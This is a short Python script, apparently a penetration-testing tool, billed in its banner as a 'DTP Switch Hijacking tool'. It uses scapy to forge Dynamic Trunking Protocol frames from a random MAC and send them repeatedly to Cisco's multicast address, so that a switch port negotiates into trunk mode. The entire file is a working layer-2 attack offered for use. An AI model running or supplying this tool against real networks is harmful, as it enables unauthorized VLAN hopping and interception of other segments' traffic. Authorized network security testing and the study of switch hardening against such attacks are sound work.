#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.l2 import *
from scapy.contrib.dtp import *
import argparse


L2BroadcastAddr = "FF:FF:FF:FF:FF:FF"
mymac = str(RandMAC())

print (r"""

.s    s.  .s        .s5SSSs.  .s    s.  .s5SSSs.  .s s.  s.  .s    s.
      SS.                 SS.       SS.       SS.    SS. SS.       SS.
sS    S%S sS        sS    S%S sSs.  S%S sS    S%S sS S%S S%S sSs.  S%S
SS    S%S SS        SS    S%S SS`S. S%S SS    S%S SS S%S S%S SS`S. S%S
SS    S%S SS        SSSs. S%S SS `S.S%S SS .sS::' SS S%S S%S SS `S.S%S
 SS   S%S SS        SS    S%S SS  `sS%S SS        SS S%S S%S SS  `sS%S
 SS   `:; SS        SS    `:; SS    `:; SS        SS `:; `:; SS    `:;
  SS  ;,. SS    ;,. SS    ;,. SS    ;,. SS        SS ;,. ;,. SS    ;,.
   `:;;:' `:;;;;;:' :;    ;:' :;    ;:' `:        `:;;:'`::' :;    ;:'
    """)
print ("DTP Switch Hijacking tool. Become a trunk!")
print("\nAuthor: Magama Bazarov, <in9uz@protonmail.com>\n")

L2CiscoMulticastAddr = "01:00:0C:CC:CC:CC"

def take_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", dest="interface", type=str, required=True, help="Specify your network interface")
    args = parser.parse_args()

    return args


def inject(interface, mymac):
    L2frame = Dot3(src=mymac, dst=L2CiscoMulticastAddr)
    LLC_layer = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
    SNAP_layer = SNAP(OUI=0x0c, code = 0x2004)
    dtp_layer = DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=mymac)])
    evil_dtp = L2frame / LLC_layer / SNAP_layer / dtp_layer
    print ("[+] Starting of DTP frame inject...")
    sendp(evil_dtp, iface=args.interface, inter=3, loop=1, verbose=1)

args = take_arguments()
inject(args.interface, mymac)
